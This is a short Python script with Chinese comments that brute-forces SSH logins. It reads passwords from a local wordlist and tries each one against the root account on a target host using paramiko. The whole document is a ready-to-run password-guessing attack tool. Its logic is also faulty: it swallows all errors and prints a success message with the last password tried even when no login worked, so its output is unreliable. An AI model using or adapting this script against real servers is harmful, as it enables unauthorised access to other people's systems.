#SSH爆破
import paramiko
import time
# 爆破SSH，建议使用证书进行登录
def ssh_crack(targethost):
    with open('D:\Softwares\PyCharm2022\MyProjects\AFinal\opt\dict\pwds.txt') as file:
        pw_list = file.readlines()
    for password in pw_list:
        try:
            transport = paramiko.Transport((targethost, 22))
            transport.connect(username='root', password=password.strip())
            # print(f"SSH破解成功，密码为：{password.strip()}")
            break
        except:
            pass
        time.sleep(1)
    return password.strip()
if __name__ == '__main__':
    targethost = '目标的IP地址'
    password = ssh_crack(targethost)
    print(f"SSH破解成功，密码为：{password}")